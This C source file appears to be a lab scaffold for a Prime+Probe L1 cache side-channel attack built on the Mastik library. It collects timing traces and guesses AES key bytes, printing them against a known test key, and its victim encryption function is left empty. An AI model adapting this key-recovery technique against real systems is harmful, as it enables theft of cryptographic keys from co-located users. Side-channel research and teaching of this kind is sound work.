/* Prime+Probe */

#include <string.h>
#include <stdio.h>
#include <stdint.h>

#include <mastik/util.h>
#include <mastik/synctrace.h>

#define AES_SIZE 16

void analyse(int64_t data[256][1024], int *key, int *offset) {
    int64_t max = INT64_MIN;

    for (int guess = 0; guess < 16; guess++) 
    {
        for (int off = 0; off < L1_SETS; off++) 
        {
            int64_t sum = 0LL;
            for (int pt = 0; pt < 16; pt++) 
            {
                int set = (off + (pt ^ guess)) % L1_SETS;
                sum += data[pt << 4][set];
            }
            if (sum > max) 
            {
                max = sum;
                *key = guess;
                *offset = off;
            }
        }
    }
}

void crypto(uint8_t *input, uint8_t *output, void *data)
{

}

int main(int argc, char** argv)
{
    const uint8_t key[] = 
    {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    };


    delayloop(1000000000);

    st_clusters_t clusters = syncPrimeProbe(1000000,
                                            AES_SIZE,
                                            1,
                                            NULL,
                                            NULL,
                                            crypto,
                                            NULL,
                                            0xf0,
                                            1);

    printf("              guess key\n");
    for (int i = 0; i < AES_SIZE; i++)
    {
        int guess, offset;
        printf("Key byte %2d: ", i);
        analyse(clusters[i].avg, &guess, &offset);
        printf(" %.2x", guess);
        printf("   ");
        printf(" %.2x", key[i]);
        printf("\n");
    }
    

    return 0;
}